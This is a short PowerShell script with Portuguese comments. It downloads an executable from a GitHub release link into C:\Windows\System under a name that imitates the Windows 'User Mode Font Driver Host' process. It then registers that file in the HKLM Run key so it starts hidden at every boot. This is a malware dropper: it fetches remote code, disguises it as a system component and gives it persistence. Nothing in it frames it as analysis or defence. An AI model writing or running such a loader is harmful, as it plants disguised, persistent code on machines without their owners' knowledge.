Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/usermodefontdriverhost.exe" -OutFile "C:\Windows\System\usermodefontdriverhost.exe" 

# Caminho do script PowerShell
$programPath = "C:\Windows\System\usermodefontdriverhost.exe"

# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
$command = "C:\Windows\System\usermodefontdriverhost.exe"

Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "User Mode Font Driver Host" -Value $command
